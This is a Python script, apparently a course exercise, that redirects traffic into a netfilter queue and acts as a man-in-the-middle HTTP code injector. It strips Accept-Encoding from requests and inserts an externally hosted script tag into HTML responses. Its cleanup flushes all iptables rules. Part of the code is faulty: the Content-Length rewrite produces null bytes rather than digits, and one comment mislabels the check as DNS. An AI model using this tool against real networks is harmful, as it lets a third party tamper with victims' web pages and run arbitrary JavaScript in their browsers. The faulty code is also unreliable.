#!/usr/bin/env python3

# Author: Nikhil Sharma
# Created Date: 16-06-2020
# Last Updated: 16-06-2020
# Operating System: Linux and Mac
# Description:

# Import necessary libraries
import netfilterqueue
import subprocess
import re
import scapy.layers.l2 as scapy
import scapy.all as scapy2

# Create a queue to trap the incoming packets (forwarded packets)
# subprocess.call("iptables -I FORWARD -j NFQUEUE --queue-num 0", shell=True)
# Create a queue to trap the incoming and outgoing packets of the hacker machine (for test purpose)
subprocess.call("iptables -I OUTPUT -j NFQUEUE --queue-num 0", shell=True)
subprocess.call("iptables -I INPUT -j NFQUEUE --queue-num 0", shell=True)


# Define a function to modify the load of a packet
def set_load(packet, load):
	packet[scapy2.Raw].load = load
	# Delete the len and cksum fields from the IP and TCP layers to avoid packet corruption
	del packet[scapy2.IP].len
	del packet[scapy2.IP].chksum
	del packet[scapy2.TCP].chksum
	return packet


# Define the callback funtion
def process_packet(packet):
	# Convert the packet to a scapy packet
	scapy_packet = scapy2.IP(packet.get_payload())

	# Check if the packet has a DNS response layer
	if scapy_packet.haslayer(scapy2.Raw):
		load_field = scapy_packet[scapy2.Raw].load

		# Check if the destination and the source ports use HTTP -> to determine whether it is a request or response
		if scapy_packet[scapy2.TCP].dport == 10000:
			print("[+] HTTP Request")
			# Decoding the html code from the packet
			load_field = re.sub(b"Accept-Encoding:.*?\\r\\n", b"", load_field)

		elif scapy_packet[scapy2.TCP].sport == 10000:
			print("[+] HTTP Response")
			# print(scapy_packet.show())
			# Inject your js code -> replace the body string with your code and set the load
			injection_code = b'<script src=<URL_TO_THE_SCRIPT_JS>></script>'
			load_field = load_field.replace(b"</body>", injection_code + b"</body>")
			# Locate and print the content length
			content_len_search = re.search(b"(?:Content-Length:\s)(\d*)", load_field)
			if content_len_search:
				content_len = content_len_search.group(1)
				# Modify the content length and update the load
				new_content_len = int(content_len) + len(injection_code)
				load_field = load_field.replace(bytes(content_len), bytes(new_content_len))
						
		# Check if the load has changed and modify and replace the packet accordingly
		if load_field != scapy_packet[scapy2.Raw].load:
			new_packet = set_load(scapy_packet, load_field)
			packet.set_payload(bytes(new_packet))

	# Forward the packet to the target
	packet.accept()


try:
	# Create a queue to trap the packets
	queue = netfilterqueue.NetfilterQueue()
	# Bind the queue to the created queue (that is currently storing the packets)
	queue.bind(0, process_packet)
	# Run the queue
	queue.run()
except KeyboardInterrupt:
	# Delete the iptables created at the started 
	print("\n[+] Deleting created iptables.......Please Wait!\n")
	subprocess.call("iptables --flush", shell=True)
